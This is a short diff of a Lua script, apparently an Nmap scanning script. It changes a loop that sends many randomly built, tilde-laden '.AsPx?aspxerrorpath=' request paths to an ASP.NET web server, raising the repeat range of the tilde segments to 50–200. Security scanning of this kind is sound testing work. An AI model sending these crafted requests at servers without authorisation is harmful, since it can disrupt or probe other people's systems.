@@ -43,7 +43,7 @@ action = function(host, port)
   local orig_payload = payload
   for i=0,iterations do
     payload = basepath .. tostring(math.random(100,999)) .. "~" .. tostring(math.random(0,9)) .."/".. 
-              repeater("~"..tostring(math.random(1,9)).."/",math.random(35,100)).."~"..
+              repeater("~"..tostring(math.random(1,9)).."/",math.random(50,200)).."~"..
               tostring(math.random(1,9))..".AsPx?aspxerrorpath=/"
     local req = http.get(host, port, payload, {no_cache=true})
     stdnse.print_debug(2, "Request #%d returned status code:%d", i, req.status)
